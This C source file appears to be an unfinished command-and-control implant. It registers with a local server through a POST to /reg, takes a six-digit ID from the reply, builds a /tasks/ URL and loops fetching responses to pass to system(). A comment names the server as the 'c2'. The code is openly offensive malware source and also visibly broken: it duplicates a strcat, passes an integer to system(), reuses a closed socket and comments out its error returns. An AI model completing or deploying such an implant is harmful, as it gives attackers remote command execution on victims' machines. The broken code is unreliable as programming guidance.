#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    char *server_ip = "127.0.0.1"; // Replace with the server IP or domain
    int server_port = 62111; // Replace with the server port
	
    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return 1;
    }
    
    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    if (inet_pton(AF_INET, server_ip, &(server_addr.sin_addr)) <= 0) {
        perror("Invalid server IP address");
        close(sockfd);
       // return 1;
    }
    
    // Connect to the server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to connect to the server");
        close(sockfd);
        //return 1;
    }
    
    // Prepare POST request body
    char *post_data = "name=test&type=p"; // Replace with your POST data
    
    // Create the POST request
    char request[BUFFER_SIZE];
    snprintf(request, sizeof(request),
             "POST /reg HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s",
             server_ip, strlen(post_data), post_data);
    
    // Send the POST request
    if (send(sockfd, request, strlen(request), 0) < 0) {
        perror("Failed to send request");
        close(sockfd);
        //return 1;
    }
    
    // Receive and store the response
    static char buffer[BUFFER_SIZE];
    static char *response = NULL;
    static ssize_t received;
    
    while ((received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0)) > 0) {
        buffer[received] = '\0';
        
        // Append the received data to the response
       if (response == NULL) {
        response = malloc(received + 1);
        strcpy(response, buffer);
    } else {
        response = realloc(response, strlen(response) + received + 1);
        strcat(response, buffer);
strcat(response, buffer);
    }
    
    // Check for receive errors
    if (received < 0) {
        perror("Failed to receive response");
        close(sockfd);
        free(response);
        //return 1;
    }
     }
    // Print the fetched text
    printf("Fetched text:\n%s\n", response);
    
    // Get the length of the response
size_t response_length = strlen(response);

// Ensure the response is at least six characters long
if (response_length < 6) {
    printf("Response is too short\n");
    // Handle the error accordingly
}

// Calculate the starting index of the last six digits
size_t start_index = response_length - 6;

// Extract the last six digits as a separate string
char last_six_digits[7]; // Including the null terminator
strcpy(last_six_digits, response + start_index);

// Print the last six digits
printf("Last six digits: %s\n", last_six_digits);
    
    // Clean up
    //close(sockfd); // this is unnecessary to do before the retrevial of commands from the c2
    free(response);
    
    printf(last_six_digits);    


//craft the url used to fetch the requests


// /tasks/<name>


char basetasks[64] = "http://127.0.0.1:62111/tasks/";
strcat(basetasks, last_six_digits);
printf("\n");
printf(basetasks);
printf("\n");

printf("halfindicator");
int h = 1;
for(;;){
	printf("indicator");



 // Construct the GET request
    char *get_request = "GET / HTTP/1.1\r\n"
                        "Host: 127.0.0.1:62111\r\n"
                        "Connection: close\r\n\r\n";

    // Send the GET request
    if (send(sockfd, get_request, strlen(get_request), 0) == -1) {
        perror("Send failed");
        return 1;
    }

    // Receive and print the response
    char response_buffer[4096];
    int bytes_received;
    while ((bytes_received = recv(sockfd, response_buffer, sizeof(response_buffer), 0)) > 0) {
        // Process and/or print the response here
        fwrite(response_buffer, 1, bytes_received, stdout);
    }

	//if request for terminal command (leaving this part out for now)
	system(bytes_received);
	

	//process response and send it back
}










//Don't close the sockets and send the GET just like the origional POST req
    
    return 0;
}
